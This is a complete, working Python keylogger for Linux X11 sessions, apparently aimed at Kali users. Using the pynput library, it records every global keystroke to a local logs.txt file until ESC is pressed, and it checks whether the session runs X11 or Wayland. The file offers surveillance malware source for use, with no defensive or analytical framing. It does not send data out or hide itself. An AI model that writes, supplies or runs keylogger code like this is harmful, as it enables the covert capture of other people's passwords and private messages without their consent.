"""
Linux Keylogger (X11) - logs keystrokes to logs.txt
Works on Kali Linux and most Linux distros using X11.
Requires: pip install pynput

Press ESC to stop logging.
"""

import os
import sys
from pynput import keyboard

LOG_FILE = "logs.txt"


def check_display_server():
    """Warn if running under Wayland, where pynput won't work globally."""
    session = os.environ.get("XDG_SESSION_TYPE", "").lower()
    if session == "wayland":
        print("[!] Wayland detected. pynput cannot capture global keys on Wayland.")
        print("    Please log out and choose an 'X11' or 'Xorg' session, then run again.")
        sys.exit(1)
    elif session == "x11":
        print("[+] X11 detected. Keylogger will work.")
    else:
        print("[?] Could not detect display server. Assuming X11...")


def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name.upper()}]"

    if key == keyboard.Key.enter:
        char = "\n"
    elif key == keyboard.Key.space:
        char = " "
    elif key == keyboard.Key.tab:
        char = "\t"

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(char)
        f.flush()


def on_release(key):
    if key == keyboard.Key.esc:
        print("\nESC pressed - stopping logger.")
        return False


def main():
    check_display_server()
    print(f"Logging keystrokes to '{os.path.abspath(LOG_FILE)}'. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
